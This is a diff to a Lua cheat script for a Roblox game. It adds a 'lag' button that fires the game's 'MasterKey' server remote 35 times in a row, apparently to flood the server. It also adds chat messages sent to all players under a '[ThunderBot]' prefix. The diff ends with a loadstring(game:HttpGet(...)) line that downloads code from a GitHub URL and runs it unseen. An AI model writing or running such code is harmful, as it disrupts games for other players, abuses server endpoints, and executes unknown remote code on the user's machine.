@@ -58,6 +58,46 @@ local ButtonNewborn = Section.NewButton("Newborn", function()
     wait(0.5) -- Add a delay of 0.1 seconds
     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
 end)
+local ButtonPup = Section.NewButton("lag", function()
+    game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+        game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+            game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                    game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                        game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                            game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                    game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                        game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                            game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                    game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                        game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                            game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                    game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                        game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                            game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                    game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                        game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                            game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                    game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                        game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                            game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                                game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                                    game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                                        game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                                            game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                                                game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                                                    game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                                                        game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+                                                                                                                                            game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age', 'Pup')
+    wait(0.5) -- Add a delay of 0.1 seconds
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+end)
+
 
 local DetailedTab = Window.NewTab("Detailed")
 local DetailedSection = DetailedTab.NewSection("Settings")
@@ -748,4 +788,23 @@ local Button = Section.NewButton("Volcano",function()
 	local args = {[1] = "Spawn",[2] = "Volcano"}
 	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
 end)
+
+
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
+
+local message = "**Bloo"
+ChatEvents.SayMessageRequest:FireServer(message, "All")
+
+
+local function sendChatMessageToChatBot(player, message)
+    local prefix = "[ThunderBot]"
+    local fullMessage = prefix .. " " .. message
+
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(fullMessage, "All")
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thunderisdead/bluefoxscript/main/tag"))()
+
 print "Oh Daddy UwU | no i dont care about it just what i did to it | i ait answering questions :> | UWU yddaD hO"
